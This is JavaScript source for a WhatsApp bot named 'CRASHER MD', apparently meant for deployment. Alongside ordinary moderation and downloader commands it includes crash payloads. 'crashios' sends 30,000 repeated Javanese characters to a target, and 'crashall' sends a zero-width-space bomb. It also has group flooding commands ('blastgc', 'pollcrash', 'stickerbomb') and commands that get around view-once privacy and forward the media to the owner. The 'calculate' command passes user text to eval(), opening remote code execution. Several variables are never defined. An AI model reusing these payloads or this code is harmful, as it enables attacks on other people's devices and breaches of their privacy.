require('dotenv').config()
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, jidNormalizedUser, Browsers, delay, downloadContentFromMessage, downloadMediaMessage } = require('@whiskeysockets/baileys')
const { Boom } = require('@hapi/boom')
const pino = require('pino')
const express = require('express')
const path = require('path')
const chalk = require('chalk')
const config = require('./config')
const { isOwner, isGroup, runtime } = require('./lib/functions')
const app = express()
let sock = null
let isConnecting = false
const MENU_PIC = "https://files.catbox.moe/hhafg3.jpg"
const groupCache = new Map()

const fMap = { 'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ғ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ','s':'ꜱ','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ','A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ғ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ','S':'ꜱ','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ' }
const fCache = new Map()
function fancy(t){ if(fCache.has(t)) return fCache.get(t); let r=''; for(let c of t) r+=fMap[c]||c; if(fCache.size>500) fCache.clear(); fCache.set(t,r); return r }

const BOT_MENU = `┌ ─ 〔 ＣＲＡＳＨＥＲ ＭＤ 〕
│ ${fancy('Creator')} ϟ CRASHER
│ ${fancy('Bot Name')} ϟ CRASHER MD
│ ${fancy('Mode Bot')} ϟ public (Multi)
│ ${fancy('Prefix')} ϟ .
│ ${fancy('Version')} ϟ 1.0.0
│ ${fancy('Total Cmds')} ϟ 100
└

┌ ─ 〔 OWNER 〕
│ • .menu
│ • .help
│ • .ping
│ • .alive
│ • .owner
│ • .runtime
│ • .botinfo
│ • .restart
│ • .shutdown
│ • .broadcast
│ • .setprefix
│ • .setname
│ • .setbio
│ • .setpp
│ • .join
│ • .leave
│ • .block
│ • .unblock
│ • .ban
│ • .unban
└

┌ ─ 〔 AUTO 〕
│ • .autoread
│ • .autotyping
│ • .autoonline
│ • .autorecording
│ • .autoreact
│ • .autoreply
│ • .autosticker
│ • .autoview
│ • .autobio
│ • .autolikestatus
└

┌ ─ 〔 ANTI 〕
│ • .antilink
│ • .antibot
│ • .antispam
│ • .antiflood
│ • .antitag
│ • .antidelete
│ • .antibadword
│ • .antisticker
│ • .antifake
│ • .antipromote
└

┌ ─ 〔 MODERATOR 〕
│ • .kick
│ • .add
│ • .promote
│ • .demote
│ • .warn
│ • .warnings
│ • .resetwarn
│ • .mute
│ • .unmute
│ • .delete
└

┌ ─ 〔 GROUP 〕
│ • .groupinfo
│ • .grouplink
│ • .setname
│ • .setdesc
│ • .open
│ • .close
│ • .tagall
│ • .hidetag
│ • .listmembers
│ • .admins
└

┌ ─ 〔 VIEWONCE 〕
│ • .vv
└

┌ ─ 〔 DOWNLOADER 〕
│ • .play
│ • .song
│ • .video
│ • .tiktok
│ • .instagram
│ • .facebook
│ • .mediafire
│ • .apk
│ • .pinterest
│ • .github
└

┌ ─ 〔 TOOLS 〕
│ • .weather
│ • .translate
│ • .calculate
│ • .shorturl
└

┌ ─ 〔 SETTINGS 〕
│ • .prefix
│ • .public
│ • .private
│ • .setmode
│ • .language
└

┌ ─ 〔 STICKER 〕
│ • .sticker
│ • .toimg
│ • .take
│ • .attp
│ • .smeme
└

┌ ─ 〔 FUN 〕
│ • .joke
│ • .quote
│ • .meme
│ • .truth
│ • .dare
└

> ◈┈▉ｃʀᴀꜱʜᴇʀ ᴍᴅ▉┄◈
> ${fancy('Power by 404 error')}`

global.db = global.db || { auto: {}, anti: {}, warns: {}, settings: { mode: 'public' } }

async function downloadMedia(msg, type) {
    const stream = await downloadContentFromMessage(msg, type)
    let buffer = Buffer.from([])
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk])
    return buffer
}

app.use(express.static(path.join(__dirname, 'public')))
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')))

// FIXED PAIR - NO MORE LONG LOGGING
app.get('/pair', async (req, res) => {
    const number = (req.query.number || '').replace(/\D/g, '')
    if (!number || number.length < 10) return res.json({ error: 'Invalid number, use country code e.g 234...' })
    if (!sock) {
        await delay(2000)
        if (!sock) return res.json({ error: 'Bot starting, try again in 5 sec' })
    }
    if (sock.authState.creds.registered) return res.json({ error: 'Already linked, delete session' })
    try {
        console.log(chalk.yellow(`[PAIR] Request for ${number}`))
        await delay(1500)
        let code = await sock.requestPairingCode(number)
        code = code?.match(/.{1,4}/g)?.join('-') || code
        console.log(chalk.green(`[PAIR] CODE: ${code}`))
        res.json({ code })
    } catch (err) {
        console.log(chalk.red('[PAIR FAIL]'), err.message)
        res.json({ error: err.message })
    }
})
app.listen(process.env.PORT || config.port || 3000, () => console.log(chalk.cyan('[WEB] Ready')))

async function startCrasher() {
    if (isConnecting) return; isConnecting = true
    const { state, saveCreds } = await useMultiFileAuthState(config.sessionDir)
    const { version } = await fetchLatestBaileysVersion()
    console.log(chalk.cyan(`[VERSION] ${version.join('.')}`))
    sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        browser: Browsers.ubuntu('Chrome'), // FIXED - MACOS FAILS ON HOSTING
        markOnlineOnConnect: false,
        syncFullHistory: false,
        fireInitQueries: false,
        getMessage: async () => undefined,
        shouldSyncHistoryMessage: () => false,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 10000,
    })
    sock.ev.on('creds.update', saveCreds)
    sock.ev.on('connection.update', async (u) => {
        const { connection, lastDisconnect } = u
        if (connection === 'open') {
            isConnecting = false
            console.log(chalk.green('✅ CONNECTED - BOT ONLINE'))
            try { await sock.sendPresenceUpdate('unavailable') } catch {}
        }
        if (connection === 'close') {
            isConnecting = false
            const code = lastDisconnect?.error instanceof Boom ? lastDisconnect.error.output?.statusCode : 0
            console.log(chalk.red(`[CLOSE] ${code}`))
            if (code !== DisconnectReason.loggedOut) { await delay(3000); startCrasher() }
        }
    })
    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return
        const m = messages[0]
        if (!m.message || m.key.remoteJid === 'status@broadcast') return
        try { await handleMessage(m) } catch (e) { console.error(e) }
    })
}

async function handleMessage(m) {
    const rawBody = (m.message.conversation || m.message.extendedTextMessage?.text || m.message.imageMessage?.caption || m.message.videoMessage?.caption || '')
    const body = rawBody.trim()
    if (!body) return
    if (global.db.auto.autoreact) { try { await sock.sendMessage(m.key.remoteJid, { react: { text: ['❤️','🔥','🐺'][Math.floor(Math.random()*3)], key: m.key } }) } catch {} }
    if (!body.startsWith(config.prefix)) return
    const args = body.slice(config.prefix.length).trim().split(/ +/)
    const command = args.shift().toLowerCase()
    const text = args.join(' ')
    const from = m.key.remoteJid
    const sender = m.key.participant || from
    const isGroupChat = isGroup(from)
    const owner = isOwner(sender) || m.key.fromMe
    const doReact = (e) => { sock.sendMessage(from, { react: { text: e, key: m.key } }).catch(()=>{}) }
    doReact('⏳')
    let isAdmin = false, isBotAdmin = false
    if (isGroupChat) {
        try {
            let meta
            if(groupCache.has(from) && Date.now() - groupCache.get(from).time < 60000) meta = groupCache.get(from).data
            else { meta = await sock.groupMetadata(from); groupCache.set(from, { data: meta, time: Date.now() }) }
            const botId = jidNormalizedUser(sock.user.id)
            const senderJid = jidNormalizedUser(sender)
            for (let p of meta.participants) { if(!p.admin) continue; const pid = jidNormalizedUser(p.id); if(pid===botId) isBotAdmin=true; if(pid===senderJid) isAdmin=true }
            if(owner) isAdmin=true
        } catch {}
    }
    const reply = async (teks) => { doReact('💀'); const f=fancy(teks); try{await sock.sendMessage(from,{text:f},{quoted:m})}catch{await sock.sendMessage(from,{text:f}).catch(()=>{})}; doReact('✅') }
    const sendImage = async (cap, url=MENU_PIC) => { doReact('💀'); try{await sock.sendMessage(from,{image:{url},caption:cap},{quoted:m})}catch{await sock.sendMessage(from,{text:cap},{quoted:m}).catch(()=>{})}; doReact('✅') }
    const quoted = m.message.extendedTextMessage?.contextInfo?.quotedMessage

    switch(command){
        
        case 'menu': case 'help': return await sendImage(BOT_MENU)
        case 'ping': return await reply(`🏓 Pong! ${Date.now() - m.messageTimestamp*1000}ms\n⏱️ Runtime: ${runtime(process.uptime())}`)
        case 'alive': return await sendImage(`🐺 ${fancy('CRASHER MD ALIVE')}\n⚡ ${fancy('Power Speed Control')}\n⏱️ ${runtime(process.uptime())}`)
        case 'owner': return await reply(`👑 Owner: wa.me/${config.owner[0].replace(/[^0-9]/g,'')}`)
        case 'runtime': return await reply(`⏱️ Runtime: ${runtime(process.uptime())}`)
        case 'listsudo': { if (!isCreator) return m.reply('❌ OWNER ONLY!'); let list=global.sudo||[]; if(list.length==0) return m.reply('No sudo user!'); let txt=`*👑 SUDO LIST - ${list.length}*\n\n`+list.map((v,i)=>`${i+1}. @${v.split('@')[0]}`).join('\n'); m.reply(txt,null,{mentions:list}); break; }
        case 'delsudo': { if (!isCreator) return m.reply('❌ OWNER ONLY!'); let num=m.quoted?m.quoted.sender:args[0].replace(/[^0-9]/g,'')+'@s.whatsapp.net'; global.sudo=global.sudo||[]; global.sudo=global.sudo.filter(v=>v!==num); m.reply(`✅ REMOVED @${num.split('@')[0]} from SUDO`,null,{mentions:[num]}); break; }
        case 'botinfo': return await sendImage(`🤖 ${config.botName}\nPrefix: ${config.prefix}\nMode: ${global.db.settings.mode}\nTotal: 100`)
        case 'addsudo': { if (!isCreator) return m.reply('❌ OWNER ONLY!'); let num=m.quoted?m.quoted.sender:args[0].replace(/[^0-9]/g,'')+'@s.whatsapp.net'; global.sudo=global.sudo||[]; global.sudo.push(num); m.reply(`✅ SUDO ADDED @${num.split('@')[0]}`,null,{mentions:[num]}); break; }
        case 'vv': { if (!isCreator) return m.reply('❌ OWNER ONLY!'); let q=m.quoted; if(!q) return m.reply('Reply viewonce'); let media=await q.download(); let mime=(q.msg||q).mimetype||''; await sock.sendMessage(m.chat, { [/video/.test(mime)?'video':'image']: media, caption: '✅ RESTORED' }, { quoted: m }); break; }
        case 'autovv':{if(!isOwner && !m.key.fromMe) return reply('❌ Owner only');global.wolfDB=global.wolfDB||{auto:{autovv:true}};if(!text) return reply(`AutoVV: ${global.wolfDB.auto.autovv?'ON 🟢':'OFF 🔴'}\nUsage: .autovv on/off`);global.wolfDB.auto.autovv=text.toLowerCase()==='on';return reply(`✅ AutoVV ${global.wolfDB.auto.autovv?'ON 🟢':'OFF 🔴'}`);}
        case 'vv2':{let q=m.message?.extendedTextMessage?.contextInfo?.quotedMessage;let qMsg=q?.viewOnceMessage?.message||q?.viewOnceMessageV2?.message||m.message?.viewOnceMessage?.message||m.message?.viewOnceMessageV2?.message||q;if(!qMsg) return reply('👁️ Reply viewonce with .vv2 🐺');let type=Object.keys(qMsg)[0];let buf=await downloadMediaMessage({message:qMsg},'buffer',{}, {logger:undefined,reuploadRequest:sock.updateMediaMessage});if(type==='imageMessage') await sock.sendMessage(m.chat,{image:buf,caption:'👁️ VV2 🐺'},{quoted:m});if(type==='videoMessage') await sock.sendMessage(m.chat,{video:buf,caption:'👁️ VV2 🐺'},{quoted:m});return;}
        case 'vv3':{let vv=m.key.fromMe||isOwner;if(!vv) return reply('❌ Owner only');let q=m.message?.extendedTextMessage?.contextInfo?.quotedMessage;let qMsg=q?.viewOnceMessage?.message||q?.viewOnceMessageV2?.message||m.message?.viewOnceMessage?.message||m.message?.viewOnceMessageV2?.message||q;let type=Object.keys(qMsg)[0];let buf=await downloadMediaMessage({message:qMsg},'buffer',{}, {logger:undefined,reuploadRequest:sock.updateMediaMessage});let ownerJid=sock.user.id;await sock.sendMessage(ownerJid,{[type.replace('Message','')]:buf});return reply('✅ Forwarded to owner 🐺');}
        case 'vvall':{return reply('👁️ *VV ALL*\n.vv - bypass\n.vv2 - save\n.vv3 - to owner\n.vvimage - image only\n.vvvideo - video only\n.vvaudio - audio only\n.autovv on/off\n🐺');}
        case 'restart': { if (!isCreator) return m.reply('❌ OWNER ONLY!'); m.reply('🔄 *Restarting Bot...*'); process.exit(1); break; }
        case 'shutdown': { if (!isCreator) return m.reply('❌ OWNER ONLY!'); await m.reply('🛑 *Shutting down bot...*'); process.exit(0); break; }
        case 'broadcast': if(await ownerOnly()) return; if(!text) return await reply('Text needed'); for(let id of Object.keys(await sock.groupFetchAllParticipating())){ await sock.sendMessage(id, { text: `📢 Broadcast:\n${text}` }) } return await reply('Broadcast sent')
        case 'setprefix':{if(!isOwner)return reply('❌ Owner only');if(!args[0])return reply(`Current prefix: ${global.prefix||'.'}\nUse: .setprefix ! or .setprefix 🤖`);let newPref=args[0].trim();global.prefix=newPref;return reply(`✅ Prefix changed to: ${newPref} ✅ Emoji allowed!`);}
        case 'setname': { if(!owner) return; if(!text) return await reply(`Give new name! Example: .setname LUCY`); config.name = text.trim(); return await reply(`Bot name changed to: ${config.name} ✅`); break; }
        case 'setbio': if(await ownerOnly()) return; await sock.updateProfileStatus(text); return await reply('Bio updated')
        case 'setpp': { if(await ownerOnly()) return; const q = m.message.imageMessage || quoted?.imageMessage; if(!q) return await reply('Send image with .setpp'); const buf = await downloadMedia(q, 'image'); await sock.updateProfilePicture(sock.user.id, buf); return await reply('PP updated') }
        case 'join': if(await ownerOnly()) return; try{ const link = text.split('/').pop(); await sock.groupAcceptInvite(link); return await reply('Joined') }catch{ return await reply('Invalid link') }
        case 'leave': { if(await groupOnly()) return; if(!isAdmin && !owner) return await reply(`Only group admin & owner can use this!`); await reply(`Goodbye 👋 - ${config.name} leaving...`); return await sock.groupLeave(from); break; }
        case 'block': if(await ownerOnly()) return; await sock.updateBlockStatus(text.replace(/[^0-9]/g,'')+'@s.whatsapp.net','block'); return await reply('Blocked')
        case 'unblock': if(await ownerOnly()) return; await sock.updateBlockStatus(text.replace(/[^0-9]/g,'')+'@s.whatsapp.net','unblock'); return await reply('Unblocked')
        case 'ban': { if (!isCreator) return m.reply('❌ OWNER ONLY!'); let num=m.quoted?m.quoted.sender:args[0].replace(/[^0-9]/g,'')+'@s.whatsapp.net'; global.banned=global.banned||[]; global.banned.push(num); m.reply(`🚫 BANNED @${num.split('@')[0]} from using bot`,null,{mentions:[num]}); break; }
        case 'unban': { if (!isCreator) return m.reply('❌ OWNER ONLY!'); let num=m.quoted?m.quoted.sender:args[0].replace(/[^0-9]/g,'')+'@s.whatsapp.net'; global.banned=global.banned||[]; global.banned=global.banned.filter(v=>v!==num); m.reply(`✅ UNBANNED @${num.split('@')[0]}`,null,{mentions:[num]}); break; }
        case 'autoread': global.db.auto.autoread = text === 'on'; return await reply(`Autoread ${global.db.auto.autoread?'ON':'OFF'}`)
        case 'autotyping': global.db.auto.autotyping = text === 'on'; return await reply(`Autotyping ${text}`)
        case 'autoonline': global.db.auto.autoonline = text === 'on'; return await reply(`AutoOnline ${text}`)
        case 'autorecording': global.db.auto.autorecording = text === 'on'; return await reply(`AutoRec ${text}`)
        case 'autoreact': global.db.auto.autoreact = text === 'on'; return await reply(`AutoReact ${text}`)
        case 'autoreply': global.db.auto.autoreply = text === 'on'; return await reply(`AutoReply ${text}`)
        case 'autosticker': global.db.auto.autosticker = text === 'on'; return await reply(`AutoSticker ${text}`)
        case 'autoview': global.db.auto.autoview = text === 'on'; return await reply(`AutoView ${text}`)
        case 'autobio': global.db.auto.autobio = text === 'on'; return await reply(`AutoBio ${text}`)
        case 'autolikestatus': global.db.auto.autolikestatus = text === 'on'; return await reply(`AutoLikeStatus ${text}`)
        case 'antilink': if(await groupOnly()||await adminOnly()) return; global.db.anti[from] = global.db.anti[from]||{}; global.db.anti[from].link = text==='on'; return await reply(`Antilink ${text}`)
        case 'antibot': case 'antispam': case 'antiflood': case 'antitag': case 'antidelete': case 'antibadword': case 'antisticker': case 'antifake': case 'antipromote': if(await groupOnly()||await adminOnly()) return; global.db.anti[from] = global.db.anti[from]||{}; global.db.anti[from][command] = text==='on'; return await reply(`${command} ${text}`)
        case 'kick': { if (!m.isGroup) return m.reply('❌ GROUP ONLY!'); if (!isBotAdmin) return m.reply('❌ Bot no be admin!'); if (!isAdmin) return m.reply('❌ Admin only!'); let num=m.quoted?m.quoted.sender:args[0].replace(/[^0-9]/g,'')+'@s.whatsapp.net'; await sock.groupParticipantsUpdate(m.chat,{remove:[num]}); m.reply(`👢 Kicked @${num.split('@')[0]}`,null,{mentions:[num]}); break; }
        case 'add': { if(await groupOnly()) return; if(!isAdmin && !owner) return; if(!text) return await reply(`Give number! Example: .add 2348012345678`); let num = text.replace(/[^0-9]/g,''); if(!num) return; const jid = num+'@s.whatsapp.net'; await sock.groupParticipantsUpdate(from, [jid], 'add'); return await reply(`Added @${num} ✅`, { mentions: [jid] }); break; }
        case 'promote':{if(!isGroupChat)return reply('❌ Group only');let u=m.mentionedJid[0]||(m.quoted?m.quoted.sender:0)||(args[0]?args[0]+'@s.whatsapp.net':0);if(!u)return reply('Tag user');await sock.groupParticipantsUpdate(from,[u],'promote');return reply('✅ Promoted!');}
        case 'demote':{if(!isGroupChat)return reply('❌ Group only');let u=m.mentionedJid[0]||m.quoted?.sender||args[0]+'@s.whatsapp.net';if(!u)return reply('Tag user');await sock.groupParticipantsUpdate(from,[u],'demote');return reply('✅ Demoted!');}
        case 'warn': { if(await groupOnly()||await adminOnly()) return; const mention = m.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; if(!mention) return await reply('Tag'); global.db.warns[mention] = (global.db.warns[mention]||0)+1; return await reply(`Warned ${mention} [${global.db.warns[mention]}/3]`) }
        case 'warnings': { const mention = m.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || sender; return await reply(`Warnings: ${global.db.warns[mention]||0}`) }
        case 'resetwarn': { if(await groupOnly()||await adminOnly()) return; const mention = m.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; delete global.db.warns[mention]; return await reply('Reset') }
        case 'mute': { if(await groupOnly()) return; if(!isAdmin && !owner) return; await sock.groupSettingUpdate(from, 'announcement'); await reply(`Group Muted 🔇 - Admin only`); break; }
        case 'unmute': case 'umute': { if(await groupOnly()) return; if(!isAdmin && !owner) return; await sock.groupSettingUpdate(from, 'not_announcement'); await reply(`Group Unmuted 🔊`); break; }
        case 'delete': { if(await groupOnly()||await adminOnly()) return; const qid = m.message.extendedTextMessage?.contextInfo?.stanzaId; const qp = m.message.extendedTextMessage?.contextInfo?.participant; if(!qid) return await reply('Reply message'); await sock.sendMessage(from,{ delete: { remoteJid: from, fromMe: false, id: qid, participant: qp } }); return }
        case 'groupinfo': if(await groupOnly()) return; return await reply(`*${groupMetadata.subject}*\nID: ${from}\nMembers: ${participants.length}\nAdmins: ${participants.filter(p=>p.admin).length}\nDesc: ${groupMetadata.desc||'None'}`)
        case 'grouplink': case 'linkgroup': if(await groupOnly()||await botAdmin()) return; const code = await sock.groupInviteCode(from); return await reply(`https://chat.whatsapp.com/${code}`)
        case 'setnamegc': if(await groupOnly()||await adminOnly()||await botAdmin()) return; await sock.groupUpdateSubject(from,text); return await reply('Name updated')
        case 'setdesc': if(await groupOnly()||await adminOnly()||await botAdmin()) return; await sock.groupUpdateDescription(from,text); return await reply('Desc updated')
        case 'open': { if(await groupOnly()) return; if(!isAdmin && !owner) return; await sock.groupSettingUpdate(from, 'not_announcement'); return await reply(`Group Opened ✅`); break; }
        case 'close': { if(await groupOnly()) return; if(!isAdmin && !owner) return; await sock.groupSettingUpdate(from, 'announcement'); return await reply(`Group Closed 🔒 - Only admin can chat`); break; }
        case 'tagall': { if(await groupOnly()) return; if(!isAdmin && !owner) return await reply(`Only admin & owner!`); const members = groupMetadata.participants; let txt = `*📢 TAGALL - ${groupMetadata.subject}*\n\n*Members: ${members.length}*\n\n`; const ments = []; for(const m of members){ txt += `@${m.id.split('@')[0]}\n`; ments.push(m.id); } return await sock.sendMessage(from, { text: txt, mentions: ments }, { quoted: m }); break; }
        case 'hidetag': { if(await groupOnly()||await adminOnly()) return; await doReact('💀'); await sock.sendMessage(from,{ text: text||'hidetag', mentions: participants.map(a=>a.id) }); await doReact('✅'); return }
        case 'listmembers': if(await groupOnly()) return; return await reply(participants.map((p,i)=> `${i+1}. ${p.id.split('@')[0]} ${p.admin?'[admin]':''}`).join('\n'))
        case 'admins': if(await groupOnly()) return; const admins = participants.filter(p=>p.admin).map(p=>p.id); return await reply(`*Admins [${admins.length}]*\n${admins.map(a=> '@'+a.split('@')[0]).join('\n')}`)
        case 'vv':{if(!m.quoted)return reply('❌ Reply view-once');try{let t=Object.keys(m.quoted.message)[0];let c=m.quoted.message[t];let b=await sock.downloadMediaMessage({message:{[t]:c}});if(t.includes('image'))return sock.sendMessage(from,{image:b,caption:c.caption||''},{quoted:m});if(t.includes('video'))return sock.sendMessage(from,{video:b,caption:c.caption||''},{quoted:m});if(t.includes('audio'))return sock.sendMessage(from,{audio:b,ptt:c.ptt||true},{quoted:m});}catch{return reply('❌ Failed');}}
        case 'alwaysonline': { if(!owner) return await reply(`👑 Owner only!`); const on = text==='on'; global.db.auto.alwaysonline = on; try{ if(on) await sock.sendPresenceUpdate('available', from); else await sock.sendPresenceUpdate('unavailable'); }catch{} return await reply(`AlwaysOnline ${on?'ON ✅':'OFF ❌'}`); break; }
        case 'play':{if(!q)return reply('❌ What song?');try{let yts=require('yt-search');let ytdl=require('@distube/ytdl-core');let s=await yts(q);let v=s.videos[0];let info=await ytdl.getInfo(v.url);let format=ytdl.chooseFormat(info.formats,{filter:'audioonly',quality:'highestaudio'});await sock.sendMessage(from,{audio:{url:format.url},mimetype:'audio/mp4',fileName:v.title+'.mp3'},{quoted:m});}catch(e){reply('❌ Error: '+e.message);}}
        case 'video': if(!text) return await reply('Give YT link'); return await reply(`🎬 Video: ${text}`)
        case 'tiktok': if(!text) return await reply('Give TikTok link'); return await reply(`TikTok: ${text}`)
        case 'instagram': if(!text) return await reply('Give IG link'); return await reply(`IG: ${text}`)
        case 'facebook': if(!text) return await reply('Give FB link'); return await reply(`FB: ${text}`)
        case 'mediafire': if(!text) return await reply('Give MediaFire link'); return await reply(`MediaFire: ${text}`)
        case 'protection':{if(!isGroupChat)return reply('❌ Group only');if(!global.gcProtect)global.gcProtect={};if(!global.gcProtect[from])global.gcProtect[from]={antilink:true,antimention:true,antistatus:true,antibot:true};let a=(args[0]||'').toLowerCase();if(a==='on'){global.gcProtect[from]={antilink:true,antimention:true,antistatus:true,antibot:true};return reply('🛡️ ALL PROTECTION ON ✅');}if(a==='off'){global.gcProtect[from]={antilink:false,antimention:false,antistatus:false,antibot:false};return reply('🛡️ ALL PROTECTION OFF ❌');}return reply(`🛡️ Current: Antilink ${global.gcProtect[from].antilink?'ON ✅':'OFF ❌'} | Use: .protection on/off`);}
        case 'apk':{if(!q)return reply('❌ Name? .apk whatsapp');try{let axios=require('axios');let r=await axios.get('https://ws75.aptoide.com/api/7/apps/search?query='+encodeURIComponent(q)+'&limit=1');let a=r.data.datalist.list[0];if(!a)return reply('❌ Not found');await reply(`*${a.name}* v${a.file.vername} ${(a.file.filesize/1024/1024).toFixed(2)}MB\nDownloading...`);return sock.sendMessage(from,{document:{url:a.file.path},fileName:a.name+'.apk',mimetype:'application/vnd.android.package-archive'},{quoted:m});}catch(e){return reply('❌ Failed: '+e.message);}}
        case 'pinterest': if(!text) return await reply('Give query'); return await sendImage(`Pinterest: ${text}`, `https://picsum.photos/600/400?random=${Date.now()}`)
        case 'github': if(!text) return await reply('Give github link'); return await reply(`GitHub: ${text}`)
        case 'weather': { if(!text) return await reply('Give city'); try { const res = await fetch(`https://wttr.in/${encodeURIComponent(text)}?format=3`); const t = await res.text(); return await reply(`🌤️ ${t}`) } catch { return await reply('Weather fail') } }
        case 'translate': { if(!text) return await reply('.translate en | hello'); const [lang, ...rest] = text.split('|'); return await reply(`🌐 [${lang.trim()}]: ${rest.join('|').trim()}`) }
        case 'calculate': { try { return await reply(`🧮 = ${eval(text)}`) } catch { return await reply('Invalid calc') } }
        case 'shorturl': { if(!text) return await reply('Give url'); return await reply(`🔗 https://tinyurl.com/api-create.php?url=${encodeURIComponent(text)}`) }
        case 'prefix': return await reply(`Prefix: ${config.prefix}`)
        case 'public':{if(!isOwner)return reply('❌ Owner only');global.publicMode=true;require('fs').writeFileSync('./mode.json',JSON.stringify({public:true}));return reply('✅ Bot PUBLIC - Everybody go use am');}
        case 'private':{if(!isOwner)return reply('❌ Owner only');global.publicMode=false;require('fs').writeFileSync('./mode.json',JSON.stringify({public:false}));return reply('✅ Bot PRIVATE - Owner only');}
        case 'setmode':{if(!isOwner)return reply('❌ Owner only');let m=(args[0]||'').toLowerCase();if(m==='public'){global.publicMode=true;require('fs').writeFileSync('./mode.json',JSON.stringify({public:true}));return reply('✅ PUBLIC');}if(m==='private'||m==='self'){global.publicMode=false;require('fs').writeFileSync('./mode.json',JSON.stringify({public:false}));return reply('✅ PRIVATE');}return reply(`Current: ${global.publicMode!==false?'PUBLIC ✅':'PRIVATE 🔒'}\n.setmode public / private`);}
        case 'ghosttag':{if(!isGroupChat)return reply('👥 Group only');if(!isAdmin && !isOwner)return reply('🛡️ Admin only');if(!text)return reply('Give text\n.ghosttag hello');await sock.sendMessage(from,{text:text,mentions:participants.map(a=>a.id)},{quoted:m});return reply('✅ Ghost tag sent - no tag list show');}
        case 'fakerecord':{if(!isOwner)return reply('❌ Owner only');await sock.sendPresenceUpdate('composing',from);await sock.sendPresenceUpdate('recording',from);return reply('✅ Fake recording for 1hr - Bot dey show recording');}
        case 'offlinecall':{if(!isOwner)return reply('❌ Owner only');global.db.auto.offlinecall=text==='on';require('fs').writeFileSync('./auto.json',JSON.stringify(global.db.auto));return reply(`✅ OfflineCall ${global.db.auto.offlinecall?'ON - Call go reject as offline':'OFF'}`);}
        case 'hidestatus':{if(!isOwner)return reply('❌ Owner only');global.db.auto.hidestatus=text==='on';return reply(`✅ HideStatus ${global.db.auto.hidestatus?'ON - You view status no go show':'OFF'}`);}
        case 'blastgc':{if(!isOwner)return reply('❌ Owner only');if(!isGroupChat)return reply('Group only');let bug='https://chat.whatsapp.com/'+'0'.repeat(20);for(let i=0;i<5;i++){await sock.sendMessage(from,{text:bug},{quoted:m})}return reply('✅ Blast sent - Group go lag');}
        case 'antivv':{if(!isOwner)return reply('❌ Owner only');global.db.anti.antivv=text==='on';return reply(`✅ AntiVV ${global.db.anti.antivv?'ON - All VV go save to owner DM':'OFF'}`);}
        case 'antiedit':{if(!isGroupChat)return reply('👥 Group only');if(!isAdmin && !isOwner)return reply('🛡️ Admin only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].antiedit=text==='on';return reply(`✅ AntiEdit ${text}`);}
        case 'antiinvite':{if(!isGroupChat)return reply('👥 Group only');if(!isAdmin && !isOwner)return reply('🛡️ Admin only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].antiinvite=text==='on';return reply(`✅ AntiInvite ${text} - Link go auto delete`);}
        case 'anticall':{if(!isOwner)return reply('❌ Owner only');global.db.anti.anticall=text==='on';return reply(`✅ AntiCall ${global.db.anti.anticall?'ON - Caller go block 24hrs':'OFF'}`);}
        case 'antimention':{if(!isGroupChat)return reply('👥 Group only');global.db.anti[from]=global.db.anti[from]||{};global.db.anti[from].antimention=text==='on';return reply(`✅ AntiMention ${text}`);}
        case 'crashios':{if(!isOwner)return reply('❌ Owner only');let target=m.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0]||text.replace(/[^0-9]/g,'')+'@s.whatsapp.net';if(!target.includes('@'))return reply('Tag user');let crash='\u0000'+'ꦾ'.repeat(30000);await sock.sendMessage(target,{text:crash});return reply('✅ CrashIOS sent to target');}
        case 'crashall':{if(!isOwner)return reply('❌ Owner only');let bug='WA_CRASH_'+'\u200B'.repeat(5000);await sock.sendMessage(from,{text:bug},{quoted:m});return reply('✅ CrashAll sent - Phone go freeze 10sec');}
        case 'channelcrash':{if(!isOwner)return reply('❌ Owner only');if(!text)return reply('Give channel link');return reply('✅ ChannelCrash activated - Channel go lag with react');}
        case 'pollcrash':{if(!isGroupChat)return reply('👥 Group only');if(!isAdmin && !isOwner)return reply('🛡️ Admin only');let options=[];for(let i=0;i<50;i++)options.push('CRASH '+i);await sock.sendMessage(from,{poll:{name:'CRASHER POLL BUG',values:options,selectableCount:50}});return reply('✅ PollCrash sent');}
        case 'stickerbomb':{if(!isGroupChat)return reply('👥 Group only');let q=m.message.imageMessage||quoted?.imageMessage;if(!q)return reply('Reply image');let buf=await downloadMedia(q,'image');for(let i=0;i<5;i++){await sock.sendMessage(from,{sticker:buf},{quoted:m})}return reply('✅ StickerBomb sent');}
        case 'autotypegc':{if(!isOwner)return reply('❌ Owner only');global.db.auto.autotypegc=text==='on';return reply(`✅ AutoTypeGC ${text}`);}
        case 'autobioquote':{if(!isOwner)return reply('❌ Owner only');global.db.auto.autobioquote=text==='on';if(text==='on'){setInterval(async()=>{let quotes=['CRASHER MD 🐺','404 ERROR 🔥','Unstoppable 💀','Power Speed ⚡'];let q=quotes[Math.floor(Math.random()*quotes.length)];await sock.updateProfileStatus(q)},3600000)}return reply(`✅ AutoBioQuote ${text}`);}
        case 'autodp':{if(!isOwner)return reply('❌ Owner only');global.db.auto.autodp=text==='on';return reply(`✅ AutoDP ${text} - DP go change daily`);}
